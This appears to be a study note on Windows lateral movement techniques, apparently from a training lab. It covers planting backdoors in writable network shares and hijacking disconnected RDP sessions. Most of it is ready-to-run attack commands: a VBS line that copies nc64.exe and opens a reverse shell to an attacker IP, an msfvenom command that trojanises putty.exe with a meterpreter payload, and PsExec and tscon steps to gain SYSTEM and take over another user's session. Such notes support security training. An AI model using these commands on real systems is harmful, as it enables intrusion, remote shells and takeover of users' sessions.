
## 🛠️ Overview

This note explains:

- How attackers abuse **writable network shares**
    
- How to **backdoor scripts and executables**
    
- How to **hijack RDP sessions** on Windows  
    All techniques rely on attacker access + user mistakes.
    

---

# 📁 **1. Abusing Writable Network Shares**

### 🔍 What is a writable share?

A network folder that:

- Users access daily
    
- Users run scripts/executables from
    
- Attackers can **write** inside
    

If the attacker can modify files users execute → **instant code execution on their machines**.

---

## 🧨 1.1 Backdooring `.vbs` Scripts

If a shared `.vbs` script exists, inject code like:

`CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

### ✔️ What this does:

- Copies `nc64.exe` from the share → `%temp%`
    
- Executes a reverse shell back to attacker
    
- Runs silently when user opens the script
    

---

## 💣 1.2 Backdooring `.exe` (e.g., PuTTY)

Use **msfvenom** to inject a payload:

`msfvenom -a x64 --platform windows -x putty.exe -k \ -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 \ -b "\x00" -f exe -o puttyX.exe`

### ✔️ Result:

- New `puttyX.exe` works normally
    
- Hidden meterpreter payload executes silently
    
- Replace the exe on the share → wait for user to run it
    
- Catch shell via `exploit/multi/handler`
    

---

# 🖥️ **2. RDP Hijacking**

## 🧠 Idea

If a user closes RDP without logging out → session remains **open** (Disconnected).

With SYSTEM privileges, you can connect to their session _without their password_.

---

## 🔓 2.1 Get SYSTEM (example using PsExec)

Run CMD as admin → then:

`PsExec64.exe -s cmd.exe`

Now you are SYSTEM.

---

## 🔍 2.2 See active/disconnected RDP sessions

`query user`

Example output:

`administrator     rdp-tcp#6     2  Active luke              ?             3  Disc`

Disconnected session = vulnerable.

---

## 🎮 2.3 Hijack the session

`tscon 3 /dest:rdp-tcp#6`

Meaning:

- Attach session **3** (luke)
    
- To your session **rdp-tcp#6**
    
- You instantly jump into their RDP session
    

⚠️ Windows Server 2019 doesn’t allow this without the user’s password.

---

